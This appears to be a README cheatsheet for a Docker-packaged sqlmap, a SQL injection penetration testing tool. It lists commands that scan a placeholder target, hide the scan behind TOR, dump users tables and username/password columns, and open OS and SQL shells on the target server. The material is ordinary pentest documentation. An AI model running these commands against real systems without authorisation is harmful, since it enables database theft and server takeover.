## Description

**sqlmap** is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches including database fingerprinting, over data fetching from the database, accessing the underlying file system, and executing commands on the operating system via out-of-band connections.

## Cheatsheet
### Easy scanning
```
docker run -it --rm secsi/sqlmap -u "<target_url>"
```

### Scanning using TOR
```
docker run -it --rm secsi/sqlmap -u "<target_url>" --tor --tor-type=SOCKS5
```

### Scanning with return time
```
docker run -it --rm secsi/sqlmap -u "<target_url>" --time-sec 15
```

### List databases
```
docker run -it --rm secsi/sqlmap -u "<target_url>" --dbs
```

### List tables in database
```
docker run -it --rm secsi/sqlmap -u "<target_url>" -D site_db --tables
```

### Dump content of a DB table
```
docker run -it --rm secsi/sqlmap -u "<target_url>" -D site_db -T users -dump
```

### List all columns in a table
```
docker run -it --rm secsi/sqlmap -u "<target_url>" -D site_db -T users --columns
```

### Dump selected columns
```
docker run -it --rm secsi/sqlmap -u "<target_url>" -D site_db -T users -C username,password --dump
```

### Dump a table from a DB when you have admin credentials
```
docker run -it --rm secsi/sqlmap -u "<target_url>" -method "POST" -data "username=admin&password=admin&submit=Submit" -D social_mccodes -T users -dump
```

### Get OS Shell
```
docker run -it --rm secsi/sqlmap --dbms=mysql -u "<target_url>" --os-shell
```

### Get SQL Shell
```
docker run -it --rm secsi/sqlmap --dbms=mysql -u "<target_url>" --sql-shell
```